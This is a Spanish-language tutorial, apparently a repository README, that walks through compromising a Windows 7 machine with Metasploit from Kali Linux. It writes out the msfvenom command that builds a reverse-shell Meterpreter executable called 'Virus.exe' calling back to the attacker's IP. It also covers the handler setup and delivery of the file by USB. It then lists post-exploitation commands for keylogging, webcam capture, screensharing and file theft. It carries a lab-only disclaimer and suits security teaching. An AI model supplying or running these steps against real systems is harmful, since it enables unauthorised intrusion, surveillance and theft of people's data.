# 1. Introducción
En este documento vamos a vulnerar una máquina **Windows 7** haciendo uso de una máquina **Kali Linux** y el **MetaSploit Framework**. 

En esta guía se va a usar el **MetaSploit Framework** que en pocas palabras es una herramienta de código abierto utilizada para desarrollar, probar y ejecutar exploits contra sistemas informáticos.

## 1.1. Requisitos
Antes de comenzar con el proceso de vulneración de la máquina Windows 7, asegúrate de contar con los siguientes requisitos:

1. **Máquina Kali Linux:** Será necesario tener una máquina con el sistema operativo Kali Linux instalado. Puedes obtener Kali Linux desde el sitio web oficial: https://www.kali.org/downloads/.
2. **Máquina Windows 7:** Aparte de tener Kali Linux, también necesitarás una máquina Windows 7 instalada. Puedes utilizar una máquina física o una máquina virtual para este propósito.
4. **MetaSploit Framework:** Por último, necesitarás tener instalado y configurado el Metasploit Framework en tu máquina Kali Linux. Puedes encontrar instrucciones detalladas sobre cómo instalar Metasploit en el sitio web oficial: https://www.metasploit.com/download.


> [!WARNING]
> Por favor, ten en cuenta que esta práctica se ha realizado en un **entorno controlado** con **fines educativos. No se ha implementado ni probado en entornos profesionales**. Se recomienda no realizar estas acciones en entornos sin autorización previa.

> [!NOTE]
> Utilizaremos **máquinas virtuales** para ejecutar Kali Linux y Windows 7, lo que nos permite realizar **pruebas de seguridad de manera segura y controlada** en un entorno aislado y reversible.

# 2. Creación del virus
Para empezar, en tu máquina **Linux** mira la **dirección IP** que tienes. Para ello puedes hacer uso del siguiente comando:

```bash
ip -c a
```
<p align="center"><img width="600" src="/images/Captura-IP.png"></p>

En mi caso la **dirección IP** de la máquina  Linux es: **192.168.0.26**

Ahora, tendremos que crear un **Virus** con la extensión `.exe` que es la extensión que usa Windows para sus archivos ejecutables. Por lo tanto se usará el comando `msfvenom`. Este es el comando completo que tendrás que usar:

```bash
msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.0.26 lport=4444 -f exe -a x86 > Virus.exe
```
<p align="center"><img width="600" src="/images/Captura-Virus.png"></p>

La opción `-p windows/meterpreter/reverse_tcp` especifica el **payload** que se utilizará con `msfvenom` para generar **payload malicioso**. Después `lhost=miIp` es donde especificamos la **dirección IP** de la **máquina atacante**, seguido por `lport=4444` que es donde definimos el puerto que va a utilizar el archivo para que la **máquina víctima se conecte a la máquina atacante**. A continuación especificamos el formato del archivo que se va a crear con la opción `-f` seguido por `exe`.  Después, definimos la arquitectura que va a usar el archivo con la opción `-a` seguido por `x86`. Finalmente, con el símbolo `>` damos nombre al archivo que se va a crear en este caso `Virus.exe`.

> [!IMPORTANT]
> Es muy importante que el archivo funcione por el puerto 4444. Este puerto se usa comúnmente para la comunicación entre la máquina atacante y la máquina víctima en muchas configuraciones de exploits y herramientas de hacking. Si no se especifica el puerto 4444 correctamente al generar el payload, es posible que la conexión entre las máquinas no se establezca correctamente.

# 3. Ejecución del Metasploit Framework
A continuación, describiremos el payload que hemos generado y explicaremos cómo puede ser utilizado para llevar a cabo un ataque exitoso.

## 3.1. Abririendo la consola de MetaSploit Framework
Con el comando `msfconsole` abriremos la consola de **MetaSploit Framework**.

```bash
msfconsole
```
<p align="center"><img width="600" src="/images/Captura-msfconsole.png"></p>

## 3.2. Configuracion del exploit y payload

Ahora que hemos abierto la consola, podremos ajustar el **exploit** y **payload** que vamos a usar para hacer esta práctica. 

Por ello, empezaremos a ajustar el exploit con el siguiente comando:

```bash
use exploit/multi/handler
```
<p align="center"><img width="600" src="/images/Captura-Exploit.png"></p>

Después, definiremos el **payload** que vamos a usar. En este caso es el que hemos puesto anteriormente al crear el virus. Para ello se va a hacer uso del siguiente comando:

```bash
set payload windows/meterpreter/reverse_tcp
```
<p align="center"><img width="600" src="/images/Captura-Payload.png"></p>

Seguidamente, vamos a definir por la **dirección IP** y **puerto** que vamos a estar escuchando. Es decir, vamos a configurar por donde el atacante va a escuchar. Para ello definiremos el `lhost` y `lport`. Ten en cuenta que esto que vamos a configurar es para que el atacante pueda estar conectado a la aplicación maliciosa que habíamos creado anteriormente, con lo cual, la IP tiene que ser de la máquina atacante. Para ello se hará uso de estos dos comandos:

```bash
set lhost 192.168.0.26 
```
```bash
set lport 4444 
```
<p align="center"><img width="600" src="/images/Captura-lhost-lport.png"></p>

Ya para terminar, lo único que nos falta es ejecutar el comando `exploit`. Al ejecutar esto, la máquina atacante se quedaría en escucha **hasta que la máquina víctima ejecute el virus**. Finalmente este es el último comando que debes de ejecutar:

```bash
exploit
```
<p align="center"><img width="600" src="/images/Captura-EjecutarExploit.png"></p>

## 3.3. Trasladar el virus a la maquina victima
El siguiente paso será **trasladar el virus a la máquina víctima y ejecutar el virus**. Para hacer esto tenemos varias opciones, pero como estoy en un entorno controlado, lo trasladaré mediante un pendrive.

<p align="center"><img width="600" src="/images/Captura-TransladoVirus.png"></p>

Una vez que hayamos entrado a la máquina víctima podemos meter el pendrive y ejecutar el archivo.

<p align="center"><img width="600" src="/images/Captura-Windwos7Pendrive.png"></p>

El archivo no va a hacer nada al ejecutar, simplemente va a conectarse a la máquina atacante y en la máquina atacante podremos ver cómo se nos ha establecido la conexión a la máquina víctima.

Al ejecutarlo se podrá ver cómo establece la conexión con la máquina víctima exitosamente.

<p align="center"><img width="600" src="/images/ConexionMaquinaVictima.png"></p>

# 4. Realizar acciones en la maquina victima

Con la conexión establecida entre la máquina atacante y la máquina víctima, podemos **comenzar a interactuar con el sistema comprometido**. A continuación, te mostraré cómo utilizar algunos comandos básicos de **Metasploit** para obtener información y realizar acciones en la máquina víctima.

## 4.1. Obtener informacion del sistema

Un comando común usado para obtener información del sistema como el sistema operativo, la arquitectura y el nombre del sistema es `sysinfo`.

```bash
sysinfo
```

<p align="center"><img width="600" src="/images/Captura-Sysinfo.png"></p>

## 4.2. Hacer captura de pantalla 

El comando `screenshot` nos permite **tomar una captura de pantalla** de la máquina víctima. Esto puede ser útil para ver qué está haciendo el usuario en ese momento. 

```bash
screenshot
```

<p align="center"><img width="600" src="/images/Captura-Screenshot.png"></p>

## 4.3. Compartir 

El comando `screenshare` permite ver la pantalla de la máquina víctima en tiempo real. Esto es especialmente útil para **monitorear actividades en curso**. 

```bash
screenshare
```

<p align="center"><img width="600" src="/images/Captura-Screenshare.png"></p>

<p align="center"><img width="600" src="/images/Captura-Screenshare-Web.png"></p>

## 4.4. Tabla de comandos

Aquí hay una tabla con algunos otros comandos de Metasploit que puedes utilizar para interactuar con la máquina víctima:

| Comando | Descripción |
|:-----:|:------|
| `shell` | Abre una sesión de línea de comandos en la máquina víctima.|
| `ps` | Lista los procesos en ejecución en la máquina víctima. |
| `kill [PID]` | Termina un proceso especificado por su ID (PID). |
| `upload` | Sube un archivo desde la máquina atacante a la víctima. |
| `download` | Descarga un archivo desde la máquina víctima a la atacante. |
| `keyscan_start` | Inicia el keylogger para capturar pulsaciones de teclas. |
| `keyscan_dump` | Muestra las pulsaciones de teclas capturadas. |
| `webcam_snap` | Toma una foto utilizando la webcam de la víctima. |
| `webcam_stream` | Inicia la transmisión de vídeo en tiempo real desde la webcam de la víctima. |

Estos comandos te permitirán experimentar más sobre **Metasploit Framework** mientras interactúas con la máquina víctima.

< [!Warning]
< 




